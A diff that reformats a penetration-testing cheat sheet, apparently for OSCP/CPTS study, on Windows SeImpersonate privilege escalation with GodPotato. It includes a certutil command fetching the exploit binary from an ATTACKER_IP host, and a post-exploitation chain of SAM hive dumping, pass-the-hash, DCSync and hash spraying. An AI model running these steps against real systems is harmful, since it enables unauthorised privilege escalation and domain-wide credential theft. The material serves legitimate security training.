@@ -12,9 +12,17 @@ leads_to:
 
 ## Prerequisites
 
-A shell running as a Windows service account (MSSQL, IIS, WinRM as a service account, etc.). `whoami /priv` must show `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`. GodPotato binary transferred to target (`C:\Windows\Temp\`).
+- A shell running as a Windows service account (MSSQL, IIS, WinRM service account, etc.)
 
-Potato attacks exploit the Windows token impersonation model — service accounts have the right to impersonate any connecting client, and these tools trick a SYSTEM-level process into connecting. GodPotato works across the widest range of Windows Server versions (2012–2022) and should be your first attempt. SeImpersonate is the single most common Windows privesc path on OSCP/CPTS.
+- `whoami /priv` shows `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`
+
+- GodPotato binary transferred to target (`C:\Windows\Temp\`)
+
+- Potato attacks trick a SYSTEM-level process into connecting, abusing the service account's right to impersonate any connecting client
+
+- GodPotato covers the widest range of Server versions (2012–2022) — try it first
+
+- SeImpersonate is the single most common Windows privesc path on OSCP/CPTS
 
 ## Quick Win
 
@@ -72,4 +80,10 @@ certutil -urlcache -f http://ATTACKER_IP:8000/GodPotato-NET4.exe C:\Windows\Temp
 
 ## Leads To
 
-SYSTEM shell → dump SAM and LSA secrets (`reg save HKLM\SAM`, `reg save HKLM\SYSTEM`) → pass-the-hash laterally. On a domain-joined machine → run SharpHound as SYSTEM → BloodHound paths. SYSTEM on DC → DCSync for all domain hashes. SYSTEM on any machine → grab local admin hash → spray subnet.
+- SYSTEM shell → dump SAM and LSA secrets (`reg save HKLM\SAM`, `reg save HKLM\SYSTEM`) → pass-the-hash laterally
+
+- Domain-joined machine → run SharpHound as SYSTEM → BloodHound paths
+
+- SYSTEM on a DC → DCSync for all domain hashes
+
+- SYSTEM on any machine → grab local admin hash → spray subnet
